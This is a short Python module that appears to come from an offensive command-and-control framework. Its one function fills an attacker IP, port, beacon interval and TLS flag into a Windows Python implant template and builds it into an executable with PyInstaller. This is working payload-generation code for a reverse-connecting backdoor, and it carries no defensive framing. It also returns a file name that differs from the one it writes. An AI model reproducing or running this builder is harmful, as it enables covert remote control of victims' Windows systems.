
import os
import shutil
import tempfile
from pathlib import Path
from . import build_pyinstaller
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
reset = Style.RESET_ALL

def generate_exe_reverse_python_tcp(ip, port, beacon_interval=5, use_tls=False):

    template_path = os.path.join(os.path.dirname(__file__), "../../../templates/windows_python_implant_tcp.py")
    
    with open(template_path, "r") as f:
        template = f.read()
    
    # Fill in the placeholders
    payload_code = template.replace("{ip}", ip).replace("{port}", str(port)).replace("{interval}", str(beacon_interval)).replace("{use_tls}", "True" if use_tls else "False")
    
    # Define output path
    out = Path.cwd() / "SentinelPythonTcp.exe"
    
    print(brightgreen + f"[*] Generating Python EXE payload for {ip}:{port}..." + reset)
    
    build_status = build_pyinstaller.build(out, payload_code)
    
    if build_status:
        return f"SentinelPython.exe"
    else:
        return False
